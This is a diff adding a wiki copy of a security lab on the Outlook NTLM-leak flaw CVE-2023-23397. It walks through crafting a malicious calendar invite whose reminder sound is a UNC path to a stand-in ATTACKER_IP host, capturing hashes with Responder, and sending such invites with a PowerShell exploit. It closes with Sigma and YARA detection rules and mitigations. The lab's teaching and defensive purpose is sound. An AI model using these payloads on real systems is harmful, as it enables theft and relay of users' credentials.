@@ -1,0 +1,337 @@
+<!--
+title: Outlook NTLM Leak
+description: 
+published: true
+date: 2023-04-02T16:58:27.048Z
+tags: 
+editor: ckeditor
+dateCreated: 2023-04-02T16:58:27.048Z
+-->
+
+<h1>Introduction</h1>
+<p>On Tuesday, March 14th, Microsoft released 83 security fixes on Patch Tuesday, including CVE-2023-23397. This critical vulnerability impacts all versions of the Outlook desktop app on any Windows system. Outlook web app (OWA) and Microsoft 365 aren't vulnerable since they do not support NTLM authentication.</p>
+<p>Unlike most exploits, this one is particularly dangerous because it is a zero-click exploit, meaning no user interaction is required to trigger it. Once an infected email arrives in the user's inbox, the attacker can obtain sensitive Net-NTLMv2 credential hashes. Once malicious actors have those hashes, they can get a user's credentials, authenticate to their system and escalate privileges.</p>
+<h1>Abusing Appointment Alerts</h1>
+<p><strong>Outlook Appointment Alerts</strong></p>
+<p>On Outlook, it's possible to add reminder notifications when sending calendar invitations:<br>&nbsp;</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a62596e7262ef8119a558ee9598ec2ef.png" alt="Outlook Appointments"></figure>
+<p>You can specify the audio file played when a user gets a notification reminder for a calendar meeting or event. Typically, this would be used for a user to set up their own notifications by pointing to an audio file:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/471b82a81e0a4b210191dafe1a0a55e1.png" alt="Reminder Sound Configuration"></figure>
+<p>Manipulating this parameter can enable a threat actor to force Outlook to leak the current password hashes to an attacker with zero interaction required.</p>
+<p><strong>Abusing Reminder Sounds via UNC Paths</strong></p>
+<p>To exploit this vulnerability, an attacker must create a malicious calendar invitation that includes a reference to a sound file pointing to a file in a network share in the attacker's machine. At a low level, an Outlook email stores the reference to the sound file in an internal parameter called <strong>PidLidReminderFileParameter</strong>. To ensure that the audio we embed in our malicious email will take precedence over the victim's default reminder configurations, we will also need to set another parameter called <strong>PidLidReminderOverride</strong> to <code>true</code>.</p>
+<p>To set up the <strong>PidLidReminderFileParameter</strong> property to point to a network share, the attacker can specify a <strong>Universal Naming Convention (UNC) </strong>path instead of a local file. UNC is used in Windows operating systems to find network resources (files, printers, shared documents). These paths consist of a double backslash, the IP address or name of the computer hosting the resource, the share name and the file name. For example:</p>
+<p><code>\\ATTACKER_IP\foo\bar.wav</code></p>
+<p>When the victim receives the malicious email, the UNC path directs them to that SMB share, triggering the vulnerability. This causes the system to start an NTLM authentication process against the attacker's machine, leaking a Net-NTLMv2 hash that the attacker can later try to crack.</p>
+<figure class="image image_resized" style="width:989.398px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c841bc06b6cfd44c8453d21204a9927b.png" alt="Exploiting the Vulnerability"></figure>
+<p>If for some reason the SMB protocol isn't a viable alternative to use, non-server versions of Windows will accept using UNC paths pointing to ports 80 or 443, and use HTTP to retrieve the file from a WebDAV-enabled web server. The syntax of such UNC path is as follows:</p>
+<p><code>\\ATTACKER_IP@80\foo\bar.wav</code></p>
+<p><code>\\ATTACKER_IP@443\foo\bar.wav</code></p>
+<p>This may be useful to bypass firewall restrictions preventing outgoing connections to port 445 (SMB).</p>
+<h1>Crafting a Malicious Appointment</h1>
+<p>Now that we understand how the vulnerability works let's craft a malicious email containing an appointment with the required parameters to trigger it.</p>
+<p><strong>Setting up Responder</strong></p>
+<p>Since we expect the victim to trigger an authentication attempt against the attacker on port 445, we will set up Responder to handle the authentication process and capture the NetNTLM hash for us. If you are unfamiliar with Responder, it will simply emulate an SMB server and capture any authentication attempt against it.</p>
+<p>To launch Responder to listen for authentication attempts in your <code>ens5</code> interface, you can simply run the following command in your AttackBox:</p>
+<p>AttackBox</p>
+<pre><code class="language-plaintext">root@attackbox$ responder -I ens5</code></pre>
+<p>We are now ready to trigger an authentication attempt via the Outlook vulnerability.</p>
+<p><strong>Attempting to Handcraft a Malicious Appointment</strong></p>
+<p>As a first attempt, we could manually create an appointment and edit the path to the reminder's sound file to point to a shared folder. To create an appointment, you will first need to click on the calendar and then on the New Appointment button on the taskbar, as shown in the image below:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/856ee9002399b21c3614d03e42d36d76.png" alt="Creating Appointments"></figure>
+<p>We will create an appointment that includes a reminder set in 0 minutes so that it triggers right after the victim receives it. We will also click on the Sound option to configure the reminder's sound file:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c8d3358b21a94b6e77e62cac19e5d428.png" alt="Setting up Reminders"></figure>
+<p>We can try setting the sound file path to a UNC path that points to our AttackBox and click the OK button like this:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c58df06376a0bb64fd81ca4bfef030f9.png" alt="Attempting to Set UNC Path"></figure>
+<p>However, Outlook will silently ignore the UNC path and revert to using the default WAV file, which can be confirmed by going back to the Sound dialogue:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/db44d3912977c59120c5bf0fef2dcf96.png" alt="Reverting to the Default Sound"></figure>
+<p>Since Outlook isn't expecting users to input a UNC path here, it probably discards our attempt as invalid output. But not all hope is lost!</p>
+<p><strong>OutlookSpy to the Rescue</strong></p>
+<p>Even if Outlook cannot set the reminder's sound file to a UNC path, we can use the OutlookSpy plugin to achieve this. This plugin will allow you to access all of Outlook's internal parameters directly, including the reminder's sound file.</p>
+<p>You can find OutlookSpy's installer in your machine's desktop. You will need to install it manually before proceeding. Be sure to close Outlook before running the installer.</p>
+<p>To view our current appointment from OutlookSpy, click the <code>OutlookSpy</code> tab and then the <code>CurrentItem</code> button in the taskbar:</p>
+<p>Note: Be sure to click the CurrentItem button from within the appointment, or you might modify different Outlook components.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/60dfeace2365e8ef434a2161783313f0.png" alt="OutlookSpy"></figure>
+<p>From this window, you can see the parameters associated with the appointment's reminder. We want to set the <strong>ReminderSoundFile</strong> parameter to the UNC path that points to our AttackBox and set both the <strong>ReminderOverrideDefault</strong> and <strong>ReminderPlaySound</strong> to <code>true</code>. Just for reference, here's what each parameter does:</p>
+<ul>
+  <li><strong>ReminderPlaySound:</strong> boolean value that indicates if a sound will be played with the reminder.</li>
+  <li><strong>ReminderOverrideDefault</strong>: boolean value that indicates the receiving Outlook client to play the sound pointed by <strong>ReminderSoundFile</strong>, instead of the default one.</li>
+  <li><strong>ReminderSoundFile</strong>: string with the path to the sound file to be used. For our exploit, this will point to a bogus shared folder in our AttackBox.</li>
+</ul>
+<p>We can use the script tab and the following script to change the parameters to the required values:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d234c96f9fb857da332b0d058b703081.png" alt="Modifying Email Parameters"></figure>
+<p>Be sure to click the <code>Run</code> button for the changes to be applied. You can go back to the <code>Properties</code> tab to check that the values were correctly changed. Finally, save your appointment to add it to your calendar, making sure the reminder is set to 0 minutes and that the appointment matches the current time and date, as we want it to trigger immediately:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/859e6a2f69ac2726bf6b400dd4f2bad2.png" alt="Saving the Appointment"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>If all went as expected, you should immediately see a reminder popping up:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d6dbc3af8bd70b13013c63d3d4bb6f10.png" alt="Appointment Pop-Up"></figure>
+<p>And you should receive the authentication attempt in your Responder console on your AttackBox:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e71d49e828ca32843cf96b66c32b190.png" alt="Responder Captured Hash"></figure>
+<h1>Weaponizing the Vulnerability</h1>
+<p>Summarising the steps required to exploit the vulnerability, an attacker would need to:</p>
+<ol>
+  <li>Create a malicious meeting/appointment with a custom reminder sound pointing to a UNC path on the attacker's machine.</li>
+  <li>Send the invite to the victim via email.</li>
+  <li>Wait for the reminder to trigger a connection against the attacker's machine.</li>
+  <li>Capture the Net-NTLMv2 hash, use authentication relaying, or profit in any other way.</li>
+</ol>
+<p>Steps 3 and 4 are already covered for us by <code>Responder</code>, but handcrafting the malicious appointment by hand is a bit tedious. Luckily, a couple of exploits are readily available for us to create and send a malicious appointment.&nbsp;</p>
+<p>In this task, we will look at the exploit published by <a href="https://github.com/api0cradle">Oddvar Moe</a>, which is probably the easiest to understand and use. This Powershell exploit leverages Outlook's COM objects to build emails and appointments easily. It contains a couple of functions that we can use:</p>
+<ul>
+  <li><strong>Save-CalendarNTLMLeak:</strong> This function creates a malicious appointment and saves it to your own calendar. Useful for testing purposes.</li>
+  <li><strong>Send-CalendarNTLMLeak:</strong> This function creates a malicious appointment and sends it via email to a victim. The email invitation will be sent from your Outlook's current default account.</li>
+</ul>
+<p><strong>Dissecting the Exploit's Code</strong></p>
+<p>Both will create an appointment similarly, so we'll explain the <strong>Save-CalendarNTLMLeak</strong> only.&nbsp;</p>
+<p>First, we will instantiate an "Outlook.Application" object and create an appointment.</p>
+<pre><code class="language-plaintext">$Outlook = New-Object -comObject Outlook.Application
+$newcal = $outlook.CreateItem('olAppointmentItem')</code></pre>
+<p>The usual parameters of an appointment will be set. These include the recipients, meeting subject, location, body and start and end dates. The exploit sets the start day to the current time so that the reminder is triggered immediately:</p>
+<pre><code class="language-plaintext">$newcal.Recipients.add($recipient)
+$newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
+$newcal.Subject = $meetingsubject
+$newcal.Location = "Virtual"
+$newcal.Body = $meetingbody
+$newcal.Start = get-date
+$newcal.End = (get-date).AddHours(2)</code></pre>
+<p>The following additional parameters will be configured to point the reminder's sound file to the attacker's server, as previously explained:</p>
+<pre><code class="language-plaintext">$newcal.ReminderSoundFile = $remotefilepath
+$newcal.ReminderOverrideDefault = 1
+$newcal.ReminderSet = 1
+$newcal.ReminderPlaysound = 1</code></pre>
+<p>Finally, the appointment will be sent to the recipient via email:</p>
+<pre><code class="language-plaintext">$newcal.send()</code></pre>
+<p><strong>Using the Exploit</strong></p>
+<p>You can import the exploit's functions with the Import-Module cmdlet. After that, both functions will be available in your current Powershell. To send an email with a malicious appointment, you can just run the following command:</p>
+<p>Powershell</p>
+<pre><code class="language-plaintext">PS C:\&gt; cd C:\Users\Administrator\Desktop\
+PS C:\Users\Administrator\Desktop\&gt; Import-Module .\CVE-2023-23397.ps1
+PS C:\Users\Administrator\Desktop\&gt; Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"</code></pre>
+<p>Be sure to replace ATTACKER_IP with the IP address of your AttackBox in the <code>-remotefilepath</code> parameter. Notice that you are using the exploit to send yourself an email in this case, as we have a single account in the machine, but normally you would target other email addresses.</p>
+<p>Since the exploit makes use of the current Outlook instance to send the email, you will likely get a couple of alerts asking you to grant permission to the script to send emails on your behalf. Make sure to press Allow as many times as needed. Marking the "Allow access for 10 minutes" checkbox should also help speed this process up:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a3a747638a701510141be9803cd28c9.png" alt="Outlook Warning"></figure>
+<h1>Detection/Mitigation</h1>
+<p>Now that we have gone through the steps to weaponize the <code>CVE-2023-23397</code> attack on Outlook, let's talk about a few ways to detect this attack within the network. Each attack leaves patterns or artifacts that could help the detection team identify the threats. It all depends on the network visibility and the log sources that are being collected and providing the much important visibility.</p>
+<p>Here, we will discuss a few ways to detect this attack on the host.</p>
+<p><strong>Sigma Rules</strong></p>
+<p>The following Sigma rule detects Outlook initiating a connection to a WebDav or SMB share, indicating a post-exploitation phase.<br>&nbsp;</p>
+<pre><code class="language-c">title: CVE-2023-23397 Exploitation Attempt
+id: 73c59189-6a6d-4b9f-a748-8f6f9bbed75c
+status: experimental
+description: Detects outlook initiating connection to a WebDAV or SMB share, which
+  could be a sign of CVE-2023-23397 exploitation.
+author: Robert Lee @quantum_cookie
+date: 2023/03/16
+references:
+- https://www.trustedsec.com/blog/critical-outlook-vulnerability-in-depth-technical-analysis-and-recommendations-cve-2023-23397/
+tags:
+- attack.credential_access
+- attack.initial_access
+- cve.2023.23397
+logsource:
+  service: security
+  product: windows
+  definition: 'Requirements: SACLs must be enabled for "Query Value" on the registry
+    keys used in this rule'
+detection:
+  selection:
+    EventID:
+    - 4656
+    - 4663
+    ProcessName|endswith: \OUTLOOK.EXE
+    Accesses|contains: Query key value
+    ObjectName|contains|all:
+    - \REGISTRY\MACHINE\SYSTEM
+    - Services\
+    ObjectName|endswith:
+    - WebClient\NetworkProvider
+    - LanmanWorkstation\NetworkProvider
+  condition: selection
+falsepositives:
+- Searchprotocolhost.exe likes to query these registry keys. To avoid false postives,
+  it's better to filter out those events before they reach the SIEM
+level: critical</code></pre>
+<p>This <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution.yml">Sigma Rule</a> looks to detect svchost.exe spawning rundll32.exe with command arguments like <code>C:\windows\system32\davclnt.dll,DavSetCookie</code>, which indicates a post-exploitation/exfiltration phase.<br>&nbsp;</p>
+<pre><code class="language-c">title: Suspicious WebDav Client Execution
+id: 982e9f2d-1a85-4d5b-aea4-31f5e97c6555
+status: experimental
+description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
+  like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator of
+  exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially
+  a sign of exploitation of CVE-2023-23397
+
+  '
+references:
+- https://twitter.com/aceresponder/status/1636116096506818562
+- https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/
+- https://www.pwndefend.com/2023/03/15/the-long-game-persistent-hash-theft/
+author: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)
+date: 2023/03/16
+tags:
+- attack.exfiltration
+- attack.t1048.003
+- cve.2023.23397
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    ParentImage|endswith: \svchost.exe
+    Image|endswith: \rundll32.exe
+    CommandLine|contains: C:\windows\system32\davclnt.dll,DavSetCookie
+    CommandLine|re: ://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
+  filter_local_ips:
+    CommandLine|contains:
+    - ://10.
+    - ://192.168.
+    - ://172.16.
+    - ://172.17.
+    - ://172.18.
+    - ://172.19.
+    - ://172.20.
+    - ://172.21.
+    - ://172.22.
+    - ://172.23.
+    - ://172.24.
+    - ://172.25.
+    - ://172.26.
+    - ://172.27.
+    - ://172.28.
+    - ://172.29.
+    - ://172.30.
+    - ://172.31.
+    - ://127.
+    - ://169.254.
+  condition: selection and not 1 of filter_*
+falsepositives:
+- Unknown
+level: high</code></pre>
+<p>These SIGMA rules can be converted into the detection and monitoring tool to hunt for suspicious log activity within the network. To learn more about SIGMA rules, check this introductory room on&nbsp;</p>
+<p><a href="https://tryhackme.com/room/sigma">Sigma</a></p>
+<p><strong>Yara Rule</strong></p>
+<p>YARA rule looks for the pattern within the files on disk. The following three community YARA rules can be used to detect the suspicious MSG file on the disk with two properties discussed in the above tasks.</p>
+<pre><code class="language-c">rule SUSP_EXPL_Msg_CVE_2023_23397_Mar23 {
+   meta:
+      description = "MSG file with a PidLidReminderFileParameter property, potentially exploiting CVE-2023-23397"
+      author = "delivr.to, modified by Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
+      date = "2023-03-15"
+      modified = "2023-03-17"
+      score = 60
+      reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
+      hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
+      hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
+      hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
+      hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
+      hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
+   strings:
+      /* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
+      /* PSETID_Appointment */
+      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
+      /* PSETID_Meeting */
+      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
+      /* PSETID Task */
+      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
+      /* PidLidReminderFileParameter */
+      $rfp = { 1F 85 00 00 }
+      /* \\ UNC path prefix - wide formatted */
+      $u1 = { 00 00 5C 00 5C 00 }
+      /* not MSI */
+      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
+   condition:
+      uint32be(0) == 0xD0CF11E0
+      and uint32be(4) == 0xA1B11AE1
+      and 1 of ($psetid*)
+      and $rfp
+      and $u1
+      and not 1 of ($fp*)
+}</code></pre>
+<pre><code class="language-c">rule EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 {
+   meta:
+      description = "Detects suspicious .msg file with a PidLidReminderFileParameter property exploiting CVE-2023-23397 (modified delivr.to rule - more specific = less FPs but limited to exfil using IP addresses, not FQDNs)"
+      author = "delivr.to, Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
+      date = "2023-03-15"
+      modified = "2023-03-18"
+      score = 75
+      reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
+      hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
+      hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
+      hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
+      hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
+      hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
+      hash = "e7a1391dd53f349094c1235760ed0642519fd87baf740839817d47488b9aef02"
+   strings:
+      /* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
+      /* PSETID_Appointment */
+      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
+      /* PSETID_Meeting */
+      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
+      /* PSETID Task */
+      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
+      /* PidLidReminderFileParameter */
+      $rfp = { 1F 85 00 00 }
+      /* \\ + IP UNC path prefix - wide formatted */
+      $u1 = { 5C 00 5C 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 3? 00 3? 00|3? 00 3? 00|3? 00) }
+      /* \\ + IP UNC path prefix - regular/ascii formatted for Transport Neutral Encapsulation Format */
+      $u2 = { 00 5C 5C (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 3? 3?|3? 3?|3?) }
+      /* not MSI */
+      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
+   condition:
+      (
+         uint16(0) == 0xCFD0 and 1 of ($psetid*)
+         or
+         uint32be(0) == 0x789F3E22
+      )
+      and any of ( $u* )
+      and $rfp
+      and not 1 of ($fp*)
+}</code></pre>
+<pre><code class="language-c">rule EXPL_SUSP_Outlook_CVE_2023_23397_SMTP_Mail_Mar23 {
+   meta:
+      author = "Nils Kuhnert"
+      date = "2023-03-17"
+      description = "Detects suspicious *.eml files that include TNEF content that possibly exploits CVE-2023-23397. Lower score than EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 as we're only looking for UNC prefix."
+      score = 60
+      reference = "https://twitter.com/wdormann/status/1636491612686622723"
+   strings:
+      // From:
+      $mail1 = { 0A 46 72 6F 6D 3A 20 }
+      // To: 
+      $mail2 = { 0A 54 6F 3A }
+      // Received:
+      $mail3 = { 0A 52 65 63 65 69 76 65 64 3A }
+      // Indicates that attachment is TNEF
+      $tnef1 = "Content-Type: application/ms-tnef" ascii
+      $tnef2 = "\x78\x9f\x3e\x22" base64
+      // Check if it's an IPM.Task
+      $ipm = "IPM.Task" base64
+      // UNC prefix in TNEF
+      $unc = "\x00\x00\x00\x5c\x5c" base64
+   condition:
+      all of them
+}</code></pre>
+<p>YARA is already installed on the machine. The YARA rule file&nbsp;</p>
+<p><code>cve-2023-23397.yar</code></p>
+<p>&nbsp;and the malicious MSG file&nbsp;</p>
+<p><code>appointment.msg</code></p>
+<p>&nbsp;can be found on the Desktop. Open the terminal and run the following command to run the rule against the MSG file.</p>
+<p>Powershell</p>
+<pre><code class="language-plaintext">PS C:\USers\Administrator\Desktop&gt; yara64 .\cve-2023-23397.yar.txt .\appointment.msg
+SUSP_EXPL_Msg_CVE_2023_23397_Mar23 .\appointment.msg
+EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 .\appointment.msg</code></pre>
+<p>To learn more about YARA and its pattern-matching use, check this introductory room on <a href="https://tryhackme.com/room/yara">YARA</a>.</p>
+<p><strong>Powershell script</strong></p>
+<p>Microsoft has released a PowerShell script <a href="https://microsoft.github.io/CSS-Exchange/Security/CVE-2023-23397/">CVE-2023-23397.ps1</a> &nbsp;that will check the Exchange messaging items like Mail, calendar,&nbsp; and tasks to see if the IOCs related to the CVE-2023-23397 attack are found. &nbsp;The script can be used to audit and clean the detected items.</p>
+<p><strong>Note: </strong>This script is not usable in this lab.</p>
+<p><strong>Mitigation</strong></p>
+<p>This vulnerability is being exploited extensively in the wild. Some of the recommended steps as recommended by <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397">Microsoft</a>&nbsp;in order to mitigate and avoid this attack are:</p>
+<ul>
+  <li>Add users to the Protected Users Security Group, which prevents using NTLM as an authentication mechanism.</li>
+  <li>Block TCP 445/SMB outbound from your network to avoid any post-exploitation connection.</li>
+  <li>Use the PowerShell script released by Microsoft to scan against the Exchange server to detect any attack attempt.</li>
+  <li>Disable WebClient service to avoid webdav connection.</li>
+</ul>
+<h1>Conclusions</h1>
+<p>In this room, we have experimented with how a simple vulnerability could allow an attacker to access authentication material without requiring any interaction from their victim by sending a simple, specially crafted email. NTLM Leaks are nothing new in Windows environments, but having one in such a widespread application as Outlook makes this particularly important.</p>
+<p>While we have used the vulnerability to capture and crack the Net-NTLMv2 hash, the fact that we can trigger an authentication attempt on behalf of the victim also enables other types of relay attacks, where cracking the hash is not even needed.</p>
+<p>As always, the preferred recommendation to avoid falling victim to such an attack is to keep your Outlook installation up to date, as patches are already available from Microsoft.</p>
+<p style="text-align:center;"><br>&nbsp;</p>
